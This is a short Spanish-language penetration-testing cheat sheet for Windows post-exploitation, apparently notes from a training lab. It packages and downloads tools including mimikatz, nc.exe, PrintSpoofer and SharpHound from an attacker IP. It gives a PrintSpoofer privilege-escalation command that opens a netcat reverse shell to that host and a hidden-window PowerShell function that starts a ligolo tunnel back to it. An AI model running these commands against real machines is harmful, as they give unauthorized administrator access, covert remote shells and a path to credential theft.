
### Subir tools

- **Comprimir archivos en zip**

* Opcion 1:
```bash
cd fwindows/     # dentro de la carpeta que tiene todo
zip -r ../tools.zip * 
```

* Opcion 2:
```bash
zip -r tools.zip agent.exe nc.exe PrintSpoofer64.exe mimikatz.exe PowerView.ps1 SharpHound.ps1
```
---
```bash
iwr -uri http://192.168.45.152:8000/tools.zip -Outfile tools.zip
```
---
```bash
Expand-Archive tools.zip -DestinationPath .
```

### WPE

```powershell
.\PrintSpoofer64.exe -c "C:\Users\eric.wallows\Documents\nc.exe 192.168.45.152 4444 -e cmd"
```

### Ejecucion en segundo plano

* Funcion

```powershell
function bg_exec($cmd) {
    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-nop -w hidden -c $cmd"
}
```
* ligolo:
```powershell
bg_exec "C:\Users\eric.wallows\Documents\agent.exe -connect 192.168.45.152:11601 -ignore-cert"
```

### Automation Script:

```bash
. .\Executor.ps1
```

* help:

```bash
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> . .\Executor.ps1 -h
=== Executor.ps1 Help ===
Funciones disponibles:
  Invoke-Ligolo -ip <IP> [-port 11601]
  Invoke-PrintSpoofer -ip <IP> [-port 4444]
  Invoke-WinPEAS [-outputPath <ruta>]
  Invoke-SharpHoundDump [-collection <tipo>]
```

#### ligolo listener

```bash
listener_add --addr <ip_destino:puerto> --to <ip_kali:puerto> --tcp
```



